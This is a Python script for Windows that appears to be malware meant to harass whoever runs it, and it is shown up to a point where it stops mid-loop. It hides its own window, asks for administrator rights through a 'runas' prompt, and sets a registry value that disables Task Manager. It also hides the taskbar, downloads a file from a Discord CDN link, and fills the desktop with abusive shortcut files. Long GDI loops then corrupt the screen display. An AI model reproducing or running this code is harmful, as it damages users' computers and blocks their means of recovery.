from win32api import *
from win32con import *
from win32gui import *
from win32file import *
from win32ui import *
from win32con import PATINVERT
from win32gui import GetDC, PatBlt
from random import randrange
from random import randint
from pathlib import Path
from ctypes import windll
import subprocess
import numpy as np
import random
import time
import ctypes
import sys
import urllib.request
import os
import winreg
import win32com.shell.shell as shell
import winshell
import pygame as pg
import multiprocessing
from sys import exit
from random import randrange as rd
import win32gui, win32con
the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

time = 0
timeSubtract = 15000

sw = GetDC(0)
sh = GetDC(0)
desk = GetDC(0)

n = 10
ScrW = GetSystemMetrics(SM_CXSCREEN)
ScrH = GetSystemMetrics(SM_CYSCREEN)

w = GetSystemMetrics(SM_CXSCREEN)
h = GetSystemMetrics(SM_CYSCREEN)
sw, sh = GetSystemMetrics(0),GetSystemMetrics(1)
x,y = GetSystemMetrics(0),GetSystemMetrics(1)

hdc = GetDC(0)
HDC = GetDC(0)
desk = GetDC(0)

w = GetSystemMetrics(0)
h = GetSystemMetrics(1)
a = GetSystemMetrics(SM_CXSCREEN)
b = GetSystemMetrics(SM_CYSCREEN)
sw = GetSystemMetrics(0)
sh = GetSystemMetrics(1)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)
xs = GetSystemMetrics(SM_CXSCREEN)
ys = GetSystemMetrics(SM_CYSCREEN)
i = 0
i < 1900

desk = GetDC(0)
x = 10000
y = 10000
x_2 = 10000
y_2 = 10000

ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)

os.system('powershell.exe REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')

opener=urllib.request.build_opener()
opener.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1941.0 Safari/537.36')]
urllib.request.install_opener(opener)

filename = '1337.jpg'
image_url = "https://cdn.discordapp.com/attachments/1012655072578113576/1031606324481495131/20221017_183453.jpg"
urllib.request.urlretrieve(image_url, filename)

h = windll.user32.FindWindowA(b'Shell_TrayWnd', None)
windll.user32.ShowWindow(h, 0)

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'cmd.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "bahahaha.exe.rar.exe.zip.mp3.mp4.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'cmd.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "get fucked.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'cmd.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "NO ESCAPE BITCH.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'cmd.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "system.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'cmd.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "bahahaha.exe.rar.exe.zip.mp3.mp4.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'cmd.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "get fucked.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'cmd.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "fuck you.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'cmd.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "system.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'cmd.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "die.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'cmd.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "get fucked.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'taskmgr.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "you got keylogged.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

desktop = Path(winshell.desktop())
miniconda_base = Path(
    winshell.folder('CSIDL_LOCAL_APPDATA')) / '1337' / '1337'
win32_cmd = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'cmd.exe')
icon = str(miniconda_base / "Menu" / "Iconleak-Atrous-Console.ico")

my_working = str(Path(winshell.folder('CSIDL_PERSONAL')) / "GOBLAX FUCKED YOUR PC AND YOUR DATA")
link_filepath = str(desktop / "sistem.1337")

arg_str = "/1337" + str(miniconda_base / "Scripts" / "stfu u bitch") + " " + str(
    miniconda_base / "1337" / "1337")

with winshell.shortcut(link_filepath) as link:
    link.path = win32_cmd
    link.description = "Made by Ghost of 1337"
    link.arguments = arg_str
    link.icon_location = (icon, 0)
    link.working_directory = my_working

for i in range(0,9):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    BitBlt(desk, -800, -300, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk,200,500,w,h,desk,0,180,SRCAND)

for i in range(0, 200):
        StretchBlt(desk, n, n, ScrW - n * 2, ScrH - n * 2, desk, 0, 0, ScrW, ScrH, SRCCOPY)
        if n < ScrW: n += 12
        if n > ScrW: n = 4

for i in range(0,4):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
    DeleteObject(brush)

for i in range(0, 200):
        StretchBlt(desk, n, n, ScrW - n * 2, ScrH - n * 2, desk, 0, 0, ScrW, ScrH, SRCCOPY)
        if n < ScrW: n += 12
        if n > ScrW: n = 4

for i in range(10):
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)

points = ((80, 20), (x, -79), (50, y))
for i in range(20):
    StretchBlt(HDC, 80, 10, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)

for i in range(100):
    BitBlt(desk, 50, 50, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk, -500, -500, sw, sh, desk, 0, 0, MERGECOPY)
    
for i in range(50):
  BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCCOPY)
  
for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCAND)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGEPAINT)

for i in range(300):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -20, -20, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(100):
    BitBlt(desk, 50, 50, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -500, -500, sw, sh, desk, 0, 0, SRCCOPY)

points = ((21, 82), (x, -25), (52, y))
for i in range(100):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(50):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, PATCOPY)

for i in range(70):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(100):
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

points = ((80, 20), (x, -79), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(20):
    StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCCOPY)

for i in range(0,10):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    DeleteObject(brush)

for i in range(40):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

def draw_rects(dc, x, y, w, h, count, dx, dy):
    for i in range(count):
        PatBlt(dc, x + i * dx, y + i * dy, w - 2 * i * dx, h - 2 * i * dy, PATINVERT)


def main(*argv):
    dc = GetDC(0)
    draw_rects(dc, 100, 100, 250, 250, 13, 10, 10)
    draw_rects(dc, 200, 300, 250, 250, 13, 10, 10)
    draw_rects(dc, 300, 400, 250, 250, 13, 10, 10)
    draw_rects(dc, 400, 500, 250, 250, 13, 10, 10)
    draw_rects(dc, 500, 600, 250, 250, 13, 10, 10)
    draw_rects(dc, 100, 400, 250, 250, 13, 10, 10)
    draw_rects(dc, 100, 400, 250, 250, 20, 10, 10)
    draw_rects(dc, 150, 450, 250, 250, 20, 10, 10)
    draw_rects(dc, 50, 60, 250, 250, 20, 10, 10)
    draw_rects(dc, 30, 40, 250, 250, 20, 10, 10)
    draw_rects(dc, 30, 60, 250, 250, 20, 10, 10)
    draw_rects(dc, 20, 80, 250, 250, 20, 10, 10)
    draw_rects(dc, 111, 110, 250, 250, 13, 10, 10)
    draw_rects(dc, 120, 120, 250, 250, 13, 10, 10)
    draw_rects(dc, 130, 130, 250, 250, 13, 10, 10)
    draw_rects(dc, 140, 140, 250, 250, 13, 10, 10)
    draw_rects(dc, 150, 150, 250, 250, 13, 10, 10)
    draw_rects(dc, 160, 160, 250, 250, 13, 10, 10)
    draw_rects(dc, 180, 120, 250, 250, 13, 10, 10)
    draw_rects(dc, 200, 180, 250, 250, 13, 10, 10)
    draw_rects(dc, 210, 190, 250, 250, 13, 10, 10)
    draw_rects(dc, 220, 200, 250, 250, 13, 10, 10)
    draw_rects(dc, 230, 210, 250, 250, 13, 10, 10)
    draw_rects(dc, 240, 230, 250, 250, 13, 10, 10)
    draw_rects(dc, 250, 240, 250, 250, 13, 10, 10)
    draw_rects(dc, 280, 270, 250, 250, 13, 10, 10)
    draw_rects(dc, 290, 280, 250, 250, 13, 10, 10)
    draw_rects(dc, 300, 300, 250, 250, 13, 10, 10)
    draw_rects(dc, 100, 100, 250, 250, 13, 10, 10)
    draw_rects(dc, 315, 241, 250, 250, 20, 30, 40)
    draw_rects(dc, 100, 430, 250, 250, 20, 30, 40)
    draw_rects(dc, 182, 252, 250, 250, 20, 30, 40)
    draw_rects(dc, 195, 348, 250, 250, 20, 30, 40)
    draw_rects(dc, 175, 520, 250, 250, 20, 30, 40)
    draw_rects(dc, 100, 400, 300, 450, 20, 30, 40)
    draw_rects(dc, 231, 400, 250, 250, 20, 30, 40)
    draw_rects(dc, 100, 400, 250, 250, 300, 30, 40)
    draw_rects(dc, 300, 700, 250, 250, 410, 30, 40)
    draw_rects(dc, 100, 400, 250, 250, 13, 40, 60)
    draw_rects(dc, 100, 400, 250, 250, 13, 60, 80)
    draw_rects(dc, 100, 400, 250, 250, 13, 80, 100)
    draw_rects(dc, 100, 400, 250, 250, 13, 100, 110)
    draw_rects(dc, 100, 400, 250, 250, 13, 300, 400)
    draw_rects(dc, 300, 200, 250, 250, 13, 600, 800)
if __name__ == "__main__":
    print("Python {:s} {:03d}bit on {:s}\n".format(" ".join(elem.strip() for elem in sys.version.split("\n")),
                                                   64 if sys.maxsize > 0x100000000 else 32, sys.platform))
    rc = main(*sys.argv[1:])

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(100):
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(90):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

points = ((-51, 90), (x, -55), (82, y))
for i in range(100):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(100):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, PATCOPY)

for i in range(0,10):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    DeleteObject(brush)

for i in range(300):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(40):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(40):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(0,10):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    DeleteObject(brush)

for i in range(300):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(40):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(100):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(200):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)
points = ((80, 20), (x, -79), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(200):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(100):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(200):
    StretchBlt(HDC, 80, 10, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)

for i in range(100):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCCOPY)

for i in range(60):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCERASE)

for i in range(200000):
    brush = CreateSolidBrush(RGB(

        randrange(255), randrange(255), randrange(255)

    ))
    SelectObject(hdc, brush)
    Pie(hdc, randrange(1,x),randrange(1,y),randrange(1,x),randrange(1,y), randrange(1,x),randrange(1,y), randrange(1,x),randrange(1,y) )

for i in range(500):
    PatBlt(desk, x, y, x_2, y_2, PATINVERT)
    x += 6000
    y += 6000
    x_2 -= 9000
    y_2 -= 9000

points = ((21, 82), (x, -25), (52, y))
for i in range(100):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(70):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, PATCOPY)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(50):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

points = ((80, 20), (x, -79), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(0,10):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    DeleteObject(brush)

for i in range(20):
    StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)

for i in range(10):
